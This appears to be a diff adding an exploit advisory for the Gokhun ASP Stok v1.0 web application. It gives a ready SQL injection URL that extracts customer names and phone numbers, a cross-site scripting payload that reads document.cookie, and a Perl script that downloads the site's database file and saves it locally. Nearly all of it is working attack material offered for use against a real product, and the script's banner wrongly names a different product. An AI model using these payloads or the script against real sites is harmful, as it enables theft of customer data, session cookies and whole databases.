@@ -1,0 +1,85 @@
+============================================
+Gokhun ASP Stok v1.0 - Multiple Remote Vulnerabilities
+============================================
+~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[+] Author : KnocKout 
+[+] Greatz : DaiMon 
+[~] Contact : knockoutr@msn.com
+~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~Script : Gokhun ASP Stok v1.0
+~Software: http://www.gokhun.com & http://www.aspindir.com/goster/6092
+~Vulnerability Style : Multiple vulnerabilities
+~Demo : http://www.site.com/asp/pages/main/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~ Explotation ~~~~~~~~~~~
+======== SQL Injection =========
+
+http://[Victim]/?eylemD=urunler&olayD=&islemD=duzenle&kimlikD=1+union+select+0,1,name,ctelephone,4,5,6+from+customers+where+Kimlik=2
+
+==================================
+======= Cross Site Scripting =====
+
+http://[Victim]/?eylemD=hizmetlerimiz&olayD=digerhizmetlerimiz%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+==============================
+Remote Database DisClosure Exploit
+==========================
+
+
+#!/usr/bin/perl -w
+#
+# Gokhun ASP Stok v1.0 -> Remote Database Disclosure Exploit
+# Coded: KnocKout
+# Date: 26.09.2010
+# Thanks: DaiMon, BARCOD3
+#
+ 
+ 
+ 
+use LWP::Simple;
+use LWP::UserAgent;
+
+system('cls');
+system('title Vural Portal 2010 Remote Database Disclosure Exploit');
+system('color 4');
+
+
+if(@ARGV < 2)
+{
+print "[-]Ornegi inceleyin\n\n";
+&help; exit();
+}
+sub help()
+{
+print "[+] usage1 : perl $0 site.com /path/ \n";
+print "[+] usage2 : perl $0 localhost / \n";
+}
+
+print "\n************************************************************************\n";
+print "\* Gokhun ASP Stok v1.0 -> Remote Database Disclosure Exploit              *\n";
+print "\* Exploited By : KnocKout                                                  *\n";
+print "\* msn :   knockoutr[at]msn[dot]com                                 *\n";
+print "\* Special Thankz : DaiMon                                      *\n";
+print "\*********************************************************************\n\n\n";
+
+($TargetIP, $path, $File,) = @ARGV;
+
+$File="database/yb.mdb";
+my $url = "http://" . $TargetIP . $path . $File;
+print "\n wait!!! \n\n";
+
+my $useragent = LWP::UserAgent->new();
+my $request = $useragent->get($url,":content_file" => "C:/db.mdb");
+
+if ($request->is_success)
+{
+print "[+] $url Exploited!\n\n";
+print "[+] Database saved to C:/db.mdb\n";
+exit();
+}
+else
+{
+print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
+exit();
+}
+
